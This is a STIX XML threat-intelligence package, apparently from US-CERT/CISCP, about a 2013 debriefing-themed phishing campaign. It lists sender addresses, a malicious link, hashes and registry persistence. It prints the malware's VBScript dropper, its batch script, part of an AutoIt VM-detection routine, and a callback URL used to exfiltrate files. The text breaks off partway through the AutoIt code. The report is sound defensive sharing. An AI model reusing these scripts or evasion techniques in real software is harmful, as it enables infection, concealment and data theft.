@@ -1,0 +1,722 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:LinkObj="http://cybox.mitre.org/objects#LinkObject-1" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:EmailMessageObj="http://cybox.mitre.org/objects#EmailMessageObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-13-10589" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Debriefing themed phishing email contains malicious embedded link</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On 12 August 2013, a Debriefing themed phishing email was observed.  The phishing email was found to contain a malicious link that leads to malware being downloaded to the targeted host. The downloaded file "sino-pak_relations_debriefing.zip" contains the malicious executable "Sino-Pak Relations.debriefing.doc.exe".
+
+On 20 August 2013, the extracted file "Sino-Pak Relations.debriefing.doc.exe" was submitted for analysis. It was found to masquerade itself as a word document, and to actually be a self-extracting archive file which contains the following four additional files: 
+gpis.exe
+iowin32.exe
+mt.vbs
+Sino-Pak Relations debriefing.doc.
+
+Overall, the malware has the ability to:
+- Deceive the user as a legitimate word document
+- Create hidden files and folders
+- Download malicious files from a remote host server and automatically execute them silently
+- Post stolen information to a remote site
+
+This document incorporates data originally released as MIFR-307451.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-09-20T18:46:42Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-d767af63-1969-47f4-8b9a-0724ef2b2a4a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-197ba348-4c08-4812-bd89-c2e3959a8493"/>
+        <indicator:Indicator idref="CISCP:indicator-4e95ebba-990b-465b-a2b1-684b9e89ca09"/>
+        <indicator:Indicator idref="CISCP:indicator-924b2f48-18cd-4d3a-8b49-b75fb325c13e"/>
+        <indicator:Indicator idref="CISCP:indicator-7bdb464b-e8a1-46b0-a7bc-9733845416fa"/>
+        <indicator:Indicator idref="CISCP:indicator-3748a4f7-1cb3-4e41-9f8e-07d23703633a"/>
+        <indicator:Indicator idref="CISCP:indicator-14062618-d0bb-4fc6-8733-b213c4980723"/>
+        <indicator:Indicator idref="CISCP:indicator-85c496df-a0af-4886-bae0-489895176d95"/>
+        <indicator:Indicator idref="CISCP:indicator-cd48850d-121e-4585-9486-5076a519a8a8"/>
+        <indicator:Indicator idref="CISCP:indicator-b92db720-e2b2-44bf-927a-219bbd1461b2"/>
+        <indicator:Indicator idref="CISCP:indicator-6bc3b172-5f92-4cdf-854e-9e459bc1fcc2"/>
+        <indicator:Indicator idref="CISCP:indicator-eeac268a-6b03-48a2-9867-0070a4c93091"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-197ba348-4c08-4812-bd89-c2e3959a8493" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malicious E-mail</indicator:Type>
+      <indicator:Description>
+Spoofed Sender: Iqbal Mirza &lt;mission@rediff.us.pn&gt; 
+True Sender 1: thakur.padmini@gmail.com 
+True Sender 2: Gshivahare@gmail.com
+Subject: Debriefing
+Date: Mon, 12 Aug 2013
+
+----- BEGIN EMAIL BODY -----
+Hi
+
+Sino-Pak Relations debriefing
+
+Regards
+Iqbal Mirza
+
+--------------------------------------------------------------------------
+
+Sino-Pak Relations debriefing.doc
+View Download   
+----- END EMAIL BODY -----
+
+The "View Download" link within the body of the email leads the targeted system to a malicious domain that automatically downloads a .ZIP file containing malware.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-cbd5d86c-6946-433f-8804-b1210b965369">
+        <cybox:Object id="CISCP:Object-45767155-955d-406e-b3a3-259f76c68966">
+          <cybox:Properties xsi:type="EmailMessageObj:EmailMessageObjectType">
+            <EmailMessageObj:Header>
+              <EmailMessageObj:From category="e-mail">
+                <AddrObj:Address_Value condition="Equals">thakur.padmini@gmail.com</AddrObj:Address_Value>
+              </EmailMessageObj:From>
+              <EmailMessageObj:Subject condition="Equals">Debriefing</EmailMessageObj:Subject>
+              <EmailMessageObj:Sender category="e-mail">
+                <cyboxCommon:Custom_Properties>
+                  <cyboxCommon:Property name="is_spoofed">true</cyboxCommon:Property>
+                </cyboxCommon:Custom_Properties>
+                <AddrObj:Address_Value condition="Equals">mission@rediff.us.pn</AddrObj:Address_Value>
+              </EmailMessageObj:Sender>
+            </EmailMessageObj:Header>
+            <EmailMessageObj:Links>
+              <EmailMessageObj:Link object_reference="CISCP:Object-a17cddd1-8fb2-43a8-be44-48686859b386"/>
+            </EmailMessageObj:Links>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-12T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-4e95ebba-990b-465b-a2b1-684b9e89ca09" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">URL Watchlist</indicator:Type>
+      <indicator:Description>This is the malicious embedded link.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-4a383138-98ac-4e9e-baf7-715fb195b41c">
+        <cybox:Object id="CISCP:Object-a17cddd1-8fb2-43a8-be44-48686859b386">
+          <cybox:Properties type="URL" xsi:type="LinkObj:LinkObjectType">
+            <URIObj:Value condition="Equals">http://ow.ly/nNTy</URIObj:Value>
+            <LinkObj:URL_Label condition="Equals">View Download</LinkObj:URL_Label>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-12T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-924b2f48-18cd-4d3a-8b49-b75fb325c13e" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Antivirus Identifier:
+Kaspersky: UDS:DangerousObject.Multi.Generic
+McAfee: Artemis!43D354B3CB98
+Symantec: Trojan.Dropper
+TrendMicro: TROJ_DROPPR.WQX
+
+This file is a self-extracting archive that presents itself as a word document. The archive consists of the following 4 files: 
+gpis.exe
+iowin32.exe
+mt.vbs
+Sino-Pak Relations debriefing.doc. 
+
+It is configured to extract the files to the location, "C:\Startup\stup\", and then execute "C:\Startup\stup\mt.vbs" after extraction. In addition, the SFX mode options are configured to extract the files, overwrite any existing older files without prompting, and hide the extraction process.
+
+The archive file contains the following comment:
+==========================================================
+;The comment below contains SFX script commands
+Path=C:\Startup\stup\
+Setup=C:\Startup\stup\mt.vbs
+Silent=1
+Overwrite=1
+Update=U
+==========================================================
+
+This file adds the following registry values:
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{75048700-EF1F-11D0-9888-006097DEACF9}\Count\HRZR_EHACNGU:P:\Qbphzragf naq Frggvatf\Nqzvavfgengbe\Qrfxgbc\Fvab-Cnx Eryngvbaf qroevrsvat.qbp.rkr:01 00 00 00 06 00 00 00 F0 67 39 B0 CC A8 CE 01
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\CurrentVersion\Internet Settings\GlobalUserOffline: 0x00000000
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\CurrentVersion\Run\msapp: "C:\Startup\stup\iowin32.exe"
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\Documents and Settings\Administrator\Desktop\Sino-Pak Relations debriefing.doc.exe: "Sino-Pak Relations debriefing.doc"
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\WINDOWS\System32\WScript.exe: "Microsoft (R) Windows Based Script Host"
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\Startup\stup\gpis.exe: "gpis"
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\Documents and Settings\Administrator\Local Settings\Temp\2.tmp\gps.bat:"gps"
+HKEY_USER\S-1-5-21-1454471165-1383384898-1801674531-500\Software\Microsoft\Windows\ShellNoRoam\MUICache\C:\Program Files\Windows NT\Accessories\WORDPAD.EXE: "WordPad"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-f99bac55-6540-4503-aafe-630ece542114">
+        <cybox:Object id="CISCP:Object-5ad3fe56-62df-425f-b691-e737116647d3">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Sino-Pak Relations debriefing.doc.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">465000</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">43d354b3cb9893faf2b373e52aadf2fe</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">2f8850ea6d91a31e7ac2f4cf0f3f5033dec5a39a</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12288:hOUj1/aOuiJv/WXfXFuLSxk0gEiLSeMAgWm5sfW224t:4UZaxIHWXf1s0gJSq7Isfg4t</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7bdb464b-e8a1-46b0-a7bc-9733845416fa" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The "Sino-Pak Relations debriefing.doc" file is a Microsoft Office Word 97-2003 document used as a decoy. The file is authored by the name "Expl0it Test0r".</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-ff9f5362-8fd0-45ef-ba09-3aac8b5c8022">
+        <cybox:Object id="CISCP:Object-01833600-7733-40f9-b1e8-06a4e565ad95">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Sino-Pak Relations debriefing.doc</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">33280</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">80355252ff2a76ad20e472d94dde2706</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d811577d20d2852c2f5009b891ba6de50d2ce221</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:3eLqDSFdakUg3CRnq3FONpgKtVHqp6Akm2W6qWyGcS2rjS:Ofeg3CRnCFtwmfru</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-3748a4f7-1cb3-4e41-9f8e-07d23703633a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is a VBScript file that initializes the following malicious program:
+"C:\Startup\stup\gpis.exe".
+
+In addition, it modifies the following two registry keys:
+"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden"
+"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt"
+
+Adjusting the DWORD value of the first of the previous keys to "2" causes hidden files and folders not to be shown. Changing the second key hides file extensions for known file types.
+
+The following are the contents of the VBScript file:
+==========================================================
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run chr(34) &amp; "C:\Startup\stup\gpis.exe" &amp; Chr(34), 0
+Set WshShell = Nothing
+Dim WshShell
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.RegWrite
+"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 2, "REG_DWORD" WshShell.RegWrite
+"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 2, "REG_DWORD" WScript.Quit
+==========================================================</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-83057641-93e8-4c64-82f5-13184d17fc79">
+        <cybox:Object id="CISCP:Object-2d3be2ab-6d5e-4147-a53b-f7b02b1cd111">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">mt.vbs</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">476</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">ac04678826cbecdade5f4d5bd03b9232</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">4c89d3ff1e7a22b93f0b6ea0eb67d40c05e935f2</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">12:JhPPmOsav++hDfyV8VjnQKljmtfyV8VjnQKlnApmuS:JZeOsa2+e8V7Pli28V7PlA4uS</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-14062618-d0bb-4fc6-8733-b213c4980723" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This executable is packed with UPX 0.89 - 3.xx and compiled by PureBasic 4.20 - 4.40.
+
+The executable creates a batch script called "gps.bat" in the location "%USERPROFILE%\LOCALS~1\Temp\[RANDOM_ALPHANUMERIC CHARACTERS].tmp\".
+
+The program then opens the command prompt from C:\WINDOWS\system32\cmd.exe and carries out the following command and then terminates.
+cmd /c ""%USERPROFILE%\LOCALS~1\Temp\[RANDOM_ALPHANUMERIC CHARACTERS]\gps.bat" 
+
+The "gps.bat" batch script creates the folder C:\Startup and C:\Startup\input from a command window. After creating those folders, it sets the system file attribute and sets those folders to be hidden. It also configures those same attributes to the C:\Startup\stup folder (created from the self-extracting archive). Next, it renders the document "C:\Startup\stup\Sino-Pak Relations debriefing.doc" to deceive the user. Then, the malicious application "C:\Startup\stup\iowin32.exe" gets executed from C:\Startup\stup.
+
+The batch script contents are:
+==========================================================
+@ echo off
+@ mkdir C:\Startup
+@ mkdir C:\Startup\input
+@ attrib C:\Startup\input +s +h
+@ attrib C:\Startup\ +s +h
+@ start "iexplore.exe" "C:\Startup\stup\Sino-Pak Relations debriefing.doc"
+@ start C:\Startup\stup\iowin32.exe
+@ attrib C:\Startup\stup\ +s +h
+@ exit
+==========================================================
+
+The file contains the following truncated strings in German.
+==========================================================
+-PB_GadgetStack_%i
+"*
+Overwrite?
+Please enter the password.
+Bitte w
+hlen Sie einen Ordner zum Speichern der Dateien aus.
+Fehler!
+An unknown error occured. The program will be terminated.
+\BDFINOPS
+Error!
+This program is not supported on this operating system.
+open
+berschreiben?
+Fortfahren?
+Continue?
+The file
+Einige Include Dateien konnten nicht erstellt werden.
+Nicht gen
+gend Speicher verf
+gbar.
+Ein unbekannter Fehler ist aufgetreten. Das Programm wird beendet.
+Can not create some of your include files.
+Password
+Passwort
+Falsches Passwort.
+Can not allocate the memory.
+existiert bereits im aktuellen Arbeitsverzeichnis.
+berschreiben?
+Das Programm wird von diesem Betriebssytem nicht unterst
+tzt.
+Choose a location to save the files.
+Wrong password.
+Die Datei
+Bitte geben Sie das Passwort ein.
+deutsch
+already exists in the current directory. Overwrite?
+==========================================================
+
+Below is the translation of strings from German to English.
+==========================================================
+-PB_GadgetStack_%i
+"*
+Overwrite?
+Please enter the password.
+Please w
+Select a folder to save the files.
+Error!
+An unknown error occured. The program will be terminated.
+\ BDFINOPS
+Error!
+This program is not supported on this operating System.
+open
+overwrite?
+Continue?
+Continue?
+The file
+Include some files could not be created.
+Non conditions
+enough memory feature
+be requested.
+An unknown error has occurred. The program is terminated.
+Can not create some of your include files.
+Password
+password
+Incorrect password.
+Can not allocate the memory.
+already exists in the current working directory.
+overwrite?
+The program is not supported by this operating system
+protected.
+Choose a location to save the files.
+Wrong password.
+the file
+Please enter a password.
+German
+already exists in the current directory. Overwrite?
+==========================================================</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-9bafbc39-ef93-4803-b6b1-afb4dc65b601">
+        <cybox:Object id="CISCP:Object-2a380016-5aaf-4ffe-b9ae-2b6e16a65535">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">gpis.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">22016</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">c7cf142fd68f2c57203c7a6b343dcaa7</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">e4fe0ab6192486eb9f651f8f407d92f2b965f751</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">384:9r9sOcIp6wRcsSYLvKWLWbstQTid6HJyraXkqdkJ7PNWo2OxEaNJawcudoD7UlOv:lmOhplcsHvKWzX6HJmFqda7koNznbcua</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-08-20T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-85c496df-a0af-4886-bae0-489895176d95" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The executable is compiled with Autoit Script v3.3.6.1.
+
+This script is designed to cause an infected user to download additional files and allow it to run automatically without one's cognizance. The downloaded files are placed in the C:\Startup directory, and executed from there. In addition, it is designed to return gathered information back to the callback host. The C:\Startup\input directory is created and any files in that directory gets uploaded to the server "alertmymail.com/speluck31/getmax.php?sysname=[COMPUTER_NAME]" on port 80. Files are then deleted upon successful transfer.
+
+The script is designed to detect virtual machines, particularly VMWare and Virtual Box. It detects the virtual machine by inspecting the service Winmgmt (Windows Management Instrumentation).
+
+The function below will return a string if it detects a virtual machine. If no virtual machines are detected, then no strings are returned.
+
+==========================================================
+00001557 Func _build()
+00001558 $strcomputer = "."
+00001559 $objwmiservice = ObjGet("winmgmts:\\" &amp; $strcomputer &amp; "\root\cimv2")
+00001560 $vmhit_count = 0
+00001561 $vmhit_details = ""
+00001562 If ProcessExists("VBoxService.exe") OR ProcessExists("VBoxTray.exe")
+OR ProcessExists("VMwareTray.exe") OR ProcessExists("VMwareUser.exe") Then
+_bootyvm($vmhit_count, $vmhit_details, "RUNNING SOFTWARE", "Found a Vbox or VMware
+guest OS service or tray process")
+00001563 If NOT IsObj($objwmiservice) Then
+00001564 Return ""
+00001565 EndIf
+00001566 $colitems = $objwmiservice.execquery("SELECT * FROM Win32_DiskDrive",
+"WQL", 16 + 32)
+00001567 If IsObj($colitems) Then
+00001568 For $objitem In $colitems
+00001569 $vreturn = $objitem.model
+00001570 Select
+00001571 Case StringInStr($vreturn, "VBOX HARDDISK")
+00001572 _bootyvm($vmhit_count, $vmhit_details, "DISKS", 'Found
+device "VBOX HARDDISK"')
+00001573 Case StringInStr($vreturn, "QEMU HARDDISK")
+00001574 _bootyvm($vmhit_count, $vmhit_details, "DISKS", 'Found
+device "QEMU HARDDISK"')
+00001575 Case StringInStr($vreturn, "VMWARE VIRTUAL IDE HARD DRIVE")
+00001576 _bootyvm($vmhit_count, $vmhit_details, "DISKS", 'Found
+device "VMWARE VIRTUAL IDE HARD DRIVE"')
+00001577 Case StringInStr($vreturn, "VMware Virtual S SCSI Disk
+Device")
+00001578 _bootyvm($vmhit_count, $vmhit_details, "DISKS", 'Found
+device "VMware Virtual S SCSI Disk Device"')
+00001579 EndSelect
+00001580 Next
+00001581 EndIf
